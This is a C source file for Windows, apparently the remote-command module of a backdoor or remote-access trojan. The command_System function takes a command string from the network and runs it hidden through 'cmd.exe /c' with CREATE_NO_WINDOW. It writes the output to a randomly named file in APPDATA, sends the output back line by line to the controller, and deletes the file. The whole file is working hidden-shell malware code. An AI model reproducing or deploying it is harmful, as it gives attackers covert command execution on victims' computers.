#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "random.h"

#define COMMAND_SYSTEM_BUFFSIZE 124
#define COMMAND_SYSTEM_DATA 0x2
#define COMMAND_SYSTEM_END 0x3

int command_System(uint8* msg)
{
	srand(time(NULL));

	char* tempPath = getenv("APPDATA");
	char* randName = random_Ascii(10);
	int pathLen = strlen(tempPath) + strlen(randName) + 1 + sizeof(char);

	char* fpath = malloc(pathLen);
	snprintf(fpath, pathLen, "%s\\%s", tempPath, randName);
	free(randName);

	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	
	memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&startInfo, 0, sizeof(STARTUPINFO));

	startInfo.cb = sizeof(STARTUPINFO);
	int cmdMsgLen = strlen((char*)msg) + strlen("cmd.exe /c ") + strlen(" > ") + strlen(fpath) + sizeof(char);
	char* cmdMsg = malloc(cmdMsgLen);
	snprintf(cmdMsg, cmdMsgLen, "cmd.exe /c %s > %s", msg, fpath);

	if(CreateProcess(NULL, cmdMsg, NULL, NULL, 1, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo) == 1)
	{
		Sleep(2000);
		TerminateProcess(procInfo.hProcess, 0);
		CloseHandle(procInfo.hProcess);
		CloseHandle(procInfo.hThread);

		FILE *f = fopen(fpath, "r");

		if(f)
		{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
			{
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return NET_LOST_CONNECTION;
			}

			char buff[COMMAND_SYSTEM_BUFFSIZE + 1];
			memset(buff, 0, COMMAND_SYSTEM_BUFFSIZE + 1);
			uint8* rmsg;

			while(fgets(buff, COMMAND_SYSTEM_BUFFSIZE, f) != NULL)
			{
				if(net_SendCmd((uint8*)buff, strlen(buff), COMMAND_SYSTEM_DATA) == NET_LOST_CONNECTION)
				{
					fclose(f);
					remove(fpath);
					free(fpath);
					free(cmdMsg);
					free(rmsg);

					return NET_LOST_CONNECTION;
				}
				
				if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
				{
					free(rmsg);
					fclose(f);
					remove(fpath);
					free(fpath);
					free(cmdMsg);
					
					return NET_LOST_CONNECTION;
				}

				free(rmsg);
				memset(buff, 0, COMMAND_SYSTEM_BUFFSIZE + 1);
			}

			if(net_SendCmd((uint8*)" ", 1, COMMAND_SYSTEM_END) == NET_LOST_CONNECTION)
			{
				fclose(f);
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return NET_LOST_CONNECTION;
			}

			fclose(f);
		}else{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
			{
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return NET_LOST_CONNECTION;
			}
		}
	}else{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(cmdMsg);
			free(fpath);

			return NET_LOST_CONNECTION;
		}
	}
	
	remove(fpath);
	free(cmdMsg);
	free(fpath);

	return COMMANDS_SUCC;
}